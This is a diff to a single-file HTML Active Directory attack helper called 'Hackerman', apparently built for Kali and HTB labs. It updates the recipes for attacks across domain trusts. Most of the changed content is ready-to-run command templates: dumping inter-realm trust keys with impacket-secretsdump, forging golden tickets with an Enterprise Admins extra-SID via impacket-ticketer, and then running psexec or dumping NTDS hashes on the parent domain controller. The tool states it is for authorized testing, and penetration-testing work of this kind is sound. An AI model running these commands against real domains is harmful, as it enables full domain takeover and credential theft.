@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Hackerman v1.10.0 — AD Attack Helper (Kali · HTB)</title>
+<title>Hackerman v1.11.0 — AD Attack Helper (Kali · HTB)</title>
 <style>
 :root{
   --bg:#0a0f1a; --panel:#0f1729; --panel2:#131d33; --line:#1e2b45;
@@ -219,7 +219,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
 
 <header>
   <div class="hwrap">
-    <div class="brand">Hackerman <b>v1.10.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
+    <div class="brand">Hackerman <b>v1.11.0</b> <span class="dim mono" style="font-size:11.5px">by @bongoalex · deepseek</span></div>
     <div class="hactions">
       <select id="presetSel" title="Load preset"><option value="">— presets —</option></select>
       <button id="presetSave" title="Save current context as preset">Save</button>
@@ -274,7 +274,7 @@ kbd{background:var(--panel2);border:1px solid var(--line);border-bottom-width:2p
   <section id="tab-legend" class="tab"></section>
 </main>
 
-<footer class="mono">Hackerman v1.10.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
+<footer class="mono">Hackerman v1.11.0 · by @bongoalex &amp; deepseek · single-file · offline · no telemetry</footer>
 
 <div id="focusOverlay" class="hidden">
   <div id="focusBox" role="dialog" aria-modal="true" tabindex="-1" aria-label="recipe focus">
@@ -323,9 +323,9 @@ const VAR_DEFS = [
   {k:'dc_fqdn',     label:'DC FQDN',       ph:'prod-dc.argon.htb',         grp:'Domain / DC', color:'v-host', derive:s=>s.dc_host?(s.dc_host.includes('.')?s.dc_host:(s.domain?s.dc_host+'.'+s.domain:s.dc_host)):'', src:['dc_host','domain'], hint:"dc_host + '.' + domain"},
   {k:'dc_ip',       label:'DC IP',         ph:'172.16.6.100',              grp:'Domain / DC', color:'v-ip', req:1},
   {k:'dc_dn',       label:'DC DN',         ph:'CN=PROD-DC,OU=DOMAIN CONTROLLERS,DC=ARGON,DC=HTB', grp:'Domain / DC', color:'v-host'},
-  {k:'parent_domain',label:'Parent domain',ph:'htb.local',                 grp:'Domain / DC', color:'v-domain'},
   {k:'trust_domain',label:'Trust domain', ph:'htb.local',                 grp:'Domain / DC', color:'v-domain'},
   {k:'trust_dc_ip', label:'Trust DC IP',  ph:'172.16.6.200',              grp:'Domain / DC', color:'v-ip'},
+  {k:'trust_netbios',label:'Trust NetBIOS',ph:'HTB',                      grp:'Domain / DC', color:'v-domain'},
   {k:'target_host', label:'Target host',   ph:'prod-sql',                  grp:'Target', color:'v-host', req:1},
   {k:'target_fqdn', label:'Target FQDN',   ph:'prod-sql.argon.htb',        grp:'Target', color:'v-host', derive:s=>s.target_host?(s.target_host.includes('.')?s.target_host:(s.domain?s.target_host+'.'+s.domain:s.target_host)):'', src:['target_host','domain'], hint:"target_host + '.' + domain"},
   {k:'target_ip',   label:'Target IP',     ph:'172.16.6.50',               grp:'Target', color:'v-ip'},
@@ -339,7 +339,9 @@ const VAR_DEFS = [
   {k:'aeskey',      label:'AES key',       ph:'2c7633c5d3497ada…',         grp:'Access', color:'v-key'},
   {k:'ccache',      label:'ccache path',   ph:'/home/kali/Administrator.ccache', grp:'Access', color:'v-file'},
   {k:'krbtgt_hash', label:'krbtgt / key',  ph:'ntlm or aes of krbtgt',     grp:'Access', color:'v-hash'},
-  {k:'domain_sid',  label:'Domain SID',    ph:'S-1-5-21-…',                grp:'Access', color:'v-sid'},
+  {k:'trust_key',   label:'Trust key',     ph:'NT hash of <trust_netbios>$',grp:'Access', color:'v-hash'},
+  {k:'domain_sid',  label:'Own domain SID',ph:'S-1-5-21-…',                grp:'Access', color:'v-sid'},
+  {k:'trust_domain_sid',label:'Trust SID', ph:'S-1-5-21-…',                grp:'Access', color:'v-sid'},
   {k:'extra_sid',   label:'Extra SID',     ph:'S-1-5-21-…-519',            grp:'Access', color:'v-sid'},
   {k:'attacker_ip', label:'Attacker IP',   ph:'10.10.14.5',                 grp:'Attacker', color:'v-ip', req:1},
   {k:'iface',       label:'Interface',     ph:'tun0',                       grp:'Attacker', color:'v-flag'},
@@ -1155,7 +1157,7 @@ function renderLegend(){
   const tab = $('#tab-legend');
   tab.innerHTML = '';
   const about = document.createElement('div');
-  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.10.0</h2>' +
+  about.innerHTML = '<h2 class="sec" style="margin-top:4px">Hackerman v1.11.0</h2>' +
     '<p class="dim">Single-file Active Directory attack helper for Kali, built by <b>@bongoalex</b> with <b>deepseek</b>. ' +
     RECIPES.length + ' recipes · ' + FLOWS.length + ' wizard flows · ' + CYPHER.length + ' BloodHound queries. Offline, no dependencies, no telemetry.</p>' +
     '<p class="dim">Use only for authorized testing (HTB labs, your own infrastructure, signed engagements). Syntax is version-sensitive — cross-check against your target versions.</p>';
@@ -2561,19 +2563,25 @@ cmds:[
  [`nltest /domain_trusts /all_trusts /v`,'from a Windows session','n'],
  [`nltest /trusted_domains`,'quick list of trusted domains','n'],
  [`netdom trust {{domain}} /domain:{{trust_domain}} /verify`,'verify the trust + show direction','n'],
- [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,trustDirection,trustAttributes,trustType`,'raw trust attributes'],
+ [`ldapsearch -x -H ldap://{{dc_ip}} -D '{{user}}@{{domain}}' -w '{{password}}' -b 'CN=System,{{domain_dn}}' '(objectClass=trustedDomain)' trustPartner,flatName,securityIdentifier,trustDirection,trustAttributes,trustType`,'FQDN + NetBIOS (flatName) + domain SID of the trust partner'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of YOUR domain'],
+ [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'SID of the TRUSTED domain'],
  [`Get-ADTrust -Filter *`,'PowerShell (RSAT)','n'],
  [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'DCs of current + trusted domains incl. trust attributes (replaces -M enum_trusts)']
-],note:'<span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card. Child DCs also hold the machine-readable trust key.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});
+],note:'Mapping: <span class="mono">flatName</span> = NetBIOS of the trusted domain, <span class="mono">securityIdentifier</span> = its domain SID, <span class="mono">trustPartner</span> = its FQDN. <span class="mono">--get-sid</span> prints the SID of whichever DC you point it at (your DC = own SID, trusted DC = target SID for extra-sid). <span class="mono">trustDirection</span>: 1 inbound, 2 outbound, 3 bidirectional. <span class="mono">trustAttributes</span>: 0x1 non-transitive, 0x4 quarantine (SID filtering on), 0x8 forest-transitive, 0x20 intra-forest. The old <span class="mono">-M enum_trusts</span> module is removed in current NetExec — <span class="mono">--dc-list</span> lists the DCs plus the trust attributes. A parent trust (intra-forest) is where SID-history / extra-sid tickets work by default — see the SID history card.<br>Next steps: cross-domain roasting, SID history, foreign group membership.'});
 
 R({id:'trust-raisechild',cat:'trust',title:'Child → parent: raiseChild / trust key',desc:'From a compromised child domain, escalate to the parent with the inter-realm trust key.',
 cmds:[
  [`impacket-raiseChild '{{domain}}/{{user}}:{{password}}'`,'automated child→parent (impacket)'],
- [`impacket-secretsdump -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump trust account key (name = NetBIOS + $)'],
- [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass -just-dc-user '{{netbios}}$' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'trust key via ccache'],
- [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -spn krbtgt/{{parent_domain}} '{{target_user}}'`,'forge inter-realm golden (extra-sid = parent SID-519)'],
- [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb <PARENT_DC> -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the parent DC']
-],note:'<b>Requires Domain Admin (or DCSync rights) in the child domain</b> — the trust key comes from secretsdump, which needs replication rights. Automated route: <span class="mono">raiseChild.py</span> dumps the trust key, forges the ticket and psexecs to the parent DC (force a host with <span class="mono">-target-exec &lt;parent-dc&gt;</span>). Manual route needs: child domain SID, trust key, parent domain SID + <span class="mono">-519</span> (Enterprise Admins RID), and SPN <span class="mono">krbtgt/&lt;parent.fqdn&gt;</span>. Compare with <span class="mono">thehacker.recipes</span> for your exact trust direction.'});
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --get-sid`,'own (child) domain SID → {{domain_sid}}'],
+ [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'trusted (parent) domain SID → {{trust_domain_sid}}'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'trusted domain NetBIOS (flatName) → {{trust_netbios}}'],
+ [`impacket-secretsdump -just-dc '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}} | grep -i '\\$'`,'list trust accounts (named after the TRUST PARTNER)'],
+ [`impacket-secretsdump -just-dc-user '{{trust_netbios}}$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump the parent trust key → {{trust_key}}'],
+ [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass -just-dc-user '{{trust_netbios}}$' '{{domain}}/{{user}}@{{dc_fqdn}}'`,'trust key via ccache'],
+ [`impacket-ticketer -nthash '{{trust_key}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{trust_domain_sid}}-519' -spn krbtgt/{{trust_domain}} '{{target_user}}'`,'forge inter-realm golden (extra-sid = trusted SID-519)'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{trust_domain}} -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the parent DC']
+],note:'<b>Requires Domain Admin (or DCSync rights) in the child domain</b> — the trust key comes from secretsdump, which needs replication rights. Trust accounts are named after the <b>partner</b> domain, so on the child DC the parent account is <span class="mono">{{trust_netbios}}$</span> (not your own NetBIOS). Flag mapping: <span class="mono">-domain-sid</span> = your (child) SID, <span class="mono">-domain</span> = your FQDN, <span class="mono">-nthash</span> = trust key, <span class="mono">-extra-sid</span> = parent SID + <span class="mono">-519</span>, <span class="mono">-spn krbtgt/&lt;parent FQDN&gt;</span>. Automated route: <span class="mono">raiseChild.py</span> (force a host with <span class="mono">-target-exec &lt;parent-dc&gt;</span>). Full mapping table: see the SID history card.'});
 
 R({id:'trust-cross-domain-roast',cat:'trust',title:'Cross-domain roasting via trust',desc:'Trusts let your credentials be accepted in the other domain — its service accounts and pre-auth-less users are roastable too.',
 cmds:[
@@ -2588,14 +2596,17 @@ cmds:[
 
 R({id:'trust-sid-history',cat:'trust',title:'SID history / ExtraSIDs across trusts',desc:'Forge an inter-realm ticket with the trust key and inject extra SIDs (for example Enterprise Admins of the parent) to cross the trust.',
 cmds:[
- [`impacket-secretsdump -just-dc '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}} | grep -i '\\$'`,'list trust accounts (name = trusted NetBIOS + $)'],
- [`impacket-secretsdump -just-dc-user '<TRUST_NETBIOS>$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'dump the inter-realm trust key'],
- [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -groups 513,512,520,518,519 -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'forge inter-realm golden (extra-sid = trusted SID-519)'],
- [`impacket-ticketer -nthash '{{krbtgt_hash}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{extra_sid}}' -extra-pac -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'with extra PAC (newer ticket requirements)'],
- [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{trust_domain}} -u '{{target_user}}' -k --use-kcache --ntds`,'use it against the trusted DC'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --get-sid`,'1) own (compromised) domain SID → {{domain_sid}}'],
+ [`nxc ldap {{trust_dc_ip}} -u '{{user}}' -p '{{password}}' --get-sid`,'2) trusted (target) domain SID → {{trust_domain_sid}}'],
+ [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --dc-list`,'3) trusted domain NetBIOS (flatName) → {{trust_netbios}}'],
+ [`impacket-secretsdump -just-dc '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}} | grep -i '\\$'`,'4) list trust accounts (named after the TRUST PARTNER)'],
+ [`impacket-secretsdump -just-dc-user '{{trust_netbios}}$' '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -dc-ip {{dc_ip}}`,'5) dump the inter-realm trust key → {{trust_key}}'],
+ [`impacket-ticketer -nthash '{{trust_key}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{trust_domain_sid}}-519' -groups 513,512,520,518,519 -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'6) forge inter-realm golden (target SID + -519 = Enterprise Admins)'],
+ [`impacket-ticketer -nthash '{{trust_key}}' -domain-sid '{{domain_sid}}' -domain {{domain}} -extra-sid '{{trust_domain_sid}}-519' -extra-pac -spn 'krbtgt/{{trust_domain}}' '{{target_user}}'`,'with extra PAC (newer ticket requirements)'],
+ [`export KRB5CCNAME=$(pwd)/'{{target_user}}.ccache' && nxc smb {{trust_domain}} -u '{{target_user}}' -k --use-kcache --ntds`,'7) use it against the trusted DC'],
  [`impacket-psexec -k -no-pass '{{domain}}/{{target_user}}@{{trust_domain}}'`,'exec via the inter-realm ticket'],
  [`impacket-secretsdump -k -no-pass '{{trust_domain}}'`,'dump with the ticket']
-],note:'<b>Requires DCSync / Domain Admin in the child domain</b> to dump the inter-realm trust key. SID filtering decides whether this works: <b>intra-forest</b> child↔parent trusts allow SID history (Quarantine off), while <b>forest trusts</b> strip SIDs that do not belong to the trusted domain (Quarantine on). Check the trust attributes with the trust-enum recipe; labs can disable it with <span class="mono">netdom trust &lt;domain&gt; /domain:&lt;trust&gt; /quarantine:no</span> and <span class="mono">/enablesidhistory:yes</span>. On Windows, mimikatz <span class="mono">kerberos::golden /sids:...</span> does the same.'});
+],note:'<b>Requires DCSync / Domain Admin in the compromised domain</b> (the trust key comes from secretsdump). <b>Which value belongs to which domain:</b><br>• <span class="mono">-domain-sid</span> → SID of YOUR (compromised) domain → <span class="mono">{{domain_sid}}</span><br>• <span class="mono">-domain</span> → FQDN of YOUR domain → <span class="mono">{{domain}}</span><br>• <span class="mono">-nthash</span> → inter-realm trust key = NT hash of the trust account named after the PARTNER domain (<span class="mono">{{trust_netbios}}$</span>) → <span class="mono">{{trust_key}}</span>. Only RC4/NT works for forging — mimikatz inter-realm AES values are derivations and cannot request a TGT (secretsdump account keys are fine).<br>• <span class="mono">-extra-sid</span> → SID of the TARGET (trusted) domain + <span class="mono">-519</span> (Enterprise Admins RID) → <span class="mono">{{trust_domain_sid}}-519</span><br>• <span class="mono">-spn</span> → <span class="mono">krbtgt/&lt;TARGET FQDN&gt;</span>, i.e. the domain you want to access → <span class="mono">krbtgt/{{trust_domain}}</span><br>SID filtering decides whether this works: <b>intra-forest</b> trusts allow SID history (Quarantine off), <b>forest trusts</b> strip foreign SIDs (Quarantine on) — check with trust-enum; labs: <span class="mono">netdom trust &lt;domain&gt; /domain:&lt;trust&gt; /quarantine:no</span>. Target SID without LDAP: BloodHound query "Domain SIDs" (<span class="mono">d.objectid</span>).'});
 
 R({id:'trust-foreign-groups',cat:'trust',title:'Foreign group membership',desc:'Users from a trusted domain can be members of your groups (and vice versa) — their own credentials then work against your resources.',
 cmds:[
@@ -2802,7 +2813,7 @@ cmds:[
  [`bhcli cypher 'MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name' | jq -c '.nodes[].properties.name'`,'unconstrained delegation hosts'],
  [`bhcli queries hackerman-bhcli-queries.json`,'import all queries from the export button below'],
  [`bhcli cypher "$(cat query.cypher)" | jq`,'run a query from a file']
-],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 29 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
+],note:'<span class="mono">cypher</span> prints JSON with <span class="mono">nodes</span>/<span class="mono">relationships</span> arrays — the jq snippets flatten them. Use the <b>bhcli</b> copy button on any query below to get the exact command, or import all 30 with the export button. Everything runs server-side against CE, so the PostgreSQL backend works too.'});
 
 R({id:'bhcli-alternatives',cat:'bh',title:'BloodHound CLI alternatives',desc:'Other terminal clients for BloodHound/Neo4j and when to pick which.',
 cmds:[
@@ -3053,7 +3064,7 @@ function zshEmit(data){
   const fnName = n => '_hk_' + n.replace(/[^A-Za-z0-9_]/g, '_');
   const q = s => "'" + String(s).replace(/'/g, "'\\''") + "'";
   let out = '#compdef ' + names.concat(Object.keys(aliases)).join(' ') + '\n';
-  out += '# Hackerman v1.10.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
+  out += '# Hackerman v1.11.0 — generated from index.html. Regenerate: "zsh" button in the header or tools/gen-zsh-completions.mjs\n\n';
   out += '_hackerman() {\n  local tool=${words[1]:t}\n  case $tool in\n';
   names.forEach(n => { out += '    ' + n + ') ' + fnName(n) + ' ;;\n'; });
   Object.keys(aliases).forEach(a => { out += '    ' + a + ') ' + fnName(aliases[a]) + ' ;;\n'; });
@@ -3205,6 +3216,7 @@ CYPHER.push(
 {t:'Privileged kerberoastable accounts',q:'MATCH (u:User {hasspn:true, admincount:true}) RETURN u.name, u.serviceprincipalnames',n:'<span class="mono">adminCount=1</span> means the account is (or was) protected — roasting these usually yields high-value passwords.'},
 {t:'RDP / DCOM access from owned',q:'MATCH p=(u {owned:true})-[:CanRDP|ExecuteDCOM]->(c:Computer) RETURN p',n:'Alternative execution paths next to CanPSRemote/AdminTo.'},
 {t:'ADCS CA permissions (ESC7)',q:'MATCH p=(u)-[:ManageCA|ManageCertificates|GenericAll|WriteDacl|WriteOwner]->(ca:EnterpriseCA) RETURN p',n:'Requires BloodHound CE ADCS collection. ManageCA/ManageCertificates rights enable the ESC7 path (see the certipy ca recipe).'},
+{t:'Domain SIDs (for extra-sid)',q:'MATCH (d:Domain) RETURN d.name, d.objectid',n:'Domain SIDs as <span class="mono">objectid</span> — add <span class="mono">-519</span> for Enterprise Admins (extra-sid) or use them for golden tickets.'},
 {t:'Shortest path between two objects (helper)',q:'MATCH p=shortestPath((a {name:"<FROM>"})-[*1..]->(b {name:"<TO>"})) RETURN p',n:'Replace <FROM> and <TO> with node names, e.g. "USER@CORP.LOCAL" or "DC01.CORP.LOCAL".'}
 );
 
